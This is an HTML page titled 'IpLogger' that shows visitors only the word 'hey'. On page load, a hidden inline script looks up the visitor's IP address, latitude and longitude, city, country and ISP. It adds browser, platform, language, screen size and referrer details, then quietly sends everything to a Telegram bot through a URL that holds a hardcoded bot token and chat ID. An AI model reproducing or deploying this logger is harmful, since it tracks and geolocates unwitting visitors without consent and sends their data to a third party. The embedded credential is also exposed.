<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IpLogger</title>
    

<script>
    var ip = '';
    var latitude = '';
    var longitude = '';
    var city = '';
    var country = '';
    var countryCode = '';
    var org = '';
    var mapLink = '';
    var browserInfo = navigator.userAgent;
    var dateVisited = new Date().toUTCString();
    var language = navigator.language;
    var platform = navigator.platform;
    var referrer = document.referrer; // Sayfa referansını al

    fetch('https://ipapi.co/json/')
        .then(function (response) {
            return response.json();
        })
        .then(function (data) {
            ip = data.ip;
            latitude = data.latitude;
            longitude = data.longitude;
            city = data.city;
            country = data.country_name;
           // countryCode = data.country.toLowerCase(); // Küçük harfe çevir
            countryCode = data.country;
            org = data.org;
            mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;

            var yerelZaman = new Date();
            var ekranGenislik = window.screen.width;
            var ekranYukseklik = window.screen.height;

            var message =
                'IP: ' + ip + '\n' +
                'Latitude: ' + latitude + '\n' +
                'Longitude: ' + longitude + '\n' +
                'City: ' + city + '\n' +
                ':flag_' + countryCode + ':\n' +
                'Country: ' + country + '\n' +
                'Organization: ' + org + '\n' +
                'Map Link: ' + mapLink + '\n\n' +
                'Browser Info: ' + browserInfo + '\n' +
                'Date Visited: ' + dateVisited + ' (' + platform + ')\n' +
                'Language: ' + language + '\n' +
                'Zaman: ' + yerelZaman + '\n' +
                'Ekran Genişliği: ' + ekranGenislik + 'x' + ekranYukseklik + '\n' +
                'Referrer: ' + referrer; // Sayfa referansını mesajın sonuna ekle

            var telegramAPI = 'https://api.telegram.org/bot6435977146:AAExFsusLAtoivKFKW01Ca1hCsQOVIf2H7I/sendMessage?chat_id=2090459804&text=' + encodeURIComponent(message);

            fetch(telegramAPI, {
                method: 'GET' // Telegram'da POST yerine GET kullanılıyor
            })
                .then(function (response) {
                    if (response.ok) {
                        console.log('Veriler Telegram API\'ye başarıyla gönderildi.');
                    } else {
                        console.error('Veriler Telegram API\'ye gönderilemedi.');
                    }
                })
                .catch(function (error) {
                    console.error('Hata:', error);
                });
        })
        .catch(function (error) {
            console.error('Hata:', error);
        });
</script>

</head>

<body>

    <h1>hey</h1>

</body>

</html>
